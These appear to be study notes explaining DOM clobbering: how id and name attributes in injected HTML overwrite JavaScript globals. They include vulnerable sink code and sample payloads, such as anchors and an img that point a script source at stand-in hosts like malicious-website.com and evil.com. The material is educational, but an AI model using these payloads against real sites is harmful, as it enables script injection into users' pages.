--------------

### Dom Clobbering

--------------

### Document Object Model

-------------

- Dom is known as the document object model.It is a programming interface that allows us to create,remove and change element from a document.DOM is very powerful in the way that it allows you to change or access the majority of the content inside the web page. The DOM views an HTML document as a tree of nodes. A node represents an HTML element. 
- Html code E.g

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>DOM tree structure</title>
  </head>
  <body>
    <h1>DOM tree structure</h1>
 <h2>Learn about the DOM</h2>
  </body>
</html>
```
- Explanation-: The document is called the `root node` and contains  a child node which is the `<html>` tag.The `<html>` contains the `<head>` and `<body>` elements.`<head>` and `<body>` have elements of their own.

---------------

### HTML Collection

---------------

- When we combine HTML elements into groups they become a collection. This becomes like an array structure where you can represent each element by the order they appear in the collection e.g. collection[0], collection[1].

---------------

### DOM CLobbering

---------------

- DOM clobbering is a technique in which you inject HTML into a page to manipulate the DOM. So you can clobber a global variable or property of an object and overwrite it DOM Node or HTML collection. However, DOM was initially born and implemented without any standardization which led to a lot of peculiar behaviour and for the sake of maintaining compatibility, browsers still support the unusual behaviour of DOM. That leads us to DOM clobbering. Due to non-standardized DOM behaviour, browsers may sometimes add name and id attributes to various DOM elements as a property reference to document or global objects. However, this results in replacement of properties on the other objects.
- How it works-:
 - The most common form of DOM clobbering uses an anchor element to overwrite a global variable, which is then used by the application in an unsafe way, such as generating a dynamic script URL.The term clobbering comes from the fact that you are “clobbering” a global variable or property of an object and overwriting it with a DOM node or HTML collection instead. For example, you can use DOM objects to overwrite other JavaScript objects and exploit unsafe names, such as submit, to interfere with a form’s actual submit() function.
- Main sink-:

```javascript
var someObject = window.someObject || {};
```

- If you can control some of the html, you can clobber the `someObject` object reference with a DOM node with an anchor.Check this code-:

```html
<script>
    window.onload = function(){
        let someObject = window.someObject || {};
        let script = document.createElement('script');
        script.src = someObject.url;
        document.body.appendChild(script);
    };
</script>
```

- Payload-:

```html
<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js> 
```

- As the two anchors use the same ID, the DOM groups them together in a DOM collection. The DOM clobbering vector then overwrites the someObject reference with this DOM collection. A name attribute is used on the last anchor element in order to clobber the url property of the someObject object, which points to an external script.

--------------

### Basics

---------------

- You can generate global variables within the js context with the attributes `id` and `name` in html tags.

```html
<form id="x"></form>
<script>
  console.log(typeof document.x) //[object HTMLFormElement]
</script>
```
- Only certain elements can use the `name` attributes.e.g

```html
embed
form
iframe
image
img
object
```
- Interestingly, when you use a form element to clobber a variable, you will get the toString value of the element itself: [object HTMLFormElement] but with anchor the toString will be the anchor href.If you clobber using the a tag, you can control the value when it's treated as a string.

```html
<a href="controlled string" id="x"></a>
<script>
  console.log(x) //controlled string
</script>
```
- Clobbering an array and attributes-:

```html
<a id=x>
  <a id =x name=y href=controlled>
  </a>
</a>
```
- Use a form to clobber 3 attributes-:

```html
<form id="x" name="y"><input id="z" value="controlled" /></form>
<form id="x"></form>
<script>
  alert(x.y.z.value) //controlled
</script>
```
- Clobbering attributes with `iframe`

```html
<iframe name="x" srcdoc="<a id=y href=controlled></a>"></iframe>
<style>
  @import "https://google.com";
</style>
<script>
  alert(x.y) //controlled
</script>
```
--------------

### Youtube Video(Ruhrsec 2023)

----------------

-  It means `codeless markup injection`.
-  Markup `id/name` collides with sensitive variables or APIs, and overwrties them.
-  Code sink-:
```js
document.globalConfig = {'src': 'script.js', [...]);
// [...]
var s =  document.createElement('script');
//sink
s.src = doocument.globalCOnfig.src;
document.body.appendChild(s);
```
- Payload-:
```html
<img id="globalConfig" src="malicious.js" name=clobbered>
```
- Dom Clobbering: Threat Model-:
 - Injection( through input params)
   -  Url params
   -  Window name
   -  Document Referrer
   -  postMessages

-----------

### Why does  `DOM Clobbering` happen?

------------

- Locating DOM elements(the ez way)-:

```js
document.querySelector("[id=Y]");
```
- The dirty way(Property access on window or document)-:

```js
document.X.Y, or window.Y
```
--------------

### Clobbering Markups and Browser Behaviours

--------------

- First DOM Clobbering instance in 2010
- Application code-:

```js
top.location = self.location
```
- Attack markup(injection)-:
```html
<iframe name=self src="evil.com">
```
- What other attack markups will work?
 - Not all built-in APIs can be successfully overshadowed-:
 - SINK-:
    ```js
    document.documentURI //can be clobbered //<iframe name=documentURI src=evil.com>
    document.location //cannot be clobbered 
    ```
-------------

### How to Clobber

-------------

- Example, Target-:

```js
window.X.Y
```

- Abuse HTML and DOM Specification rules-:

```
R1- Named Access on Window
R2- DOM Tree Accessors
R3- Form Parent Child
R4- Window Proxies
R5- HTMLCollection
```

- Rules R1+R3-:

```html
<form id=X name=Y>
```

- Rules R1+R5-:

```html
<a id=X><a id=X name=Y>
```

-------------

### Double DOM Clobbering trick

--------------

- 

---------------

### REFERENCES

---------------

- [IBM](https://medium.com/@ibm_ptc_security/dom-clobbering-baa55c208bce)

---------------
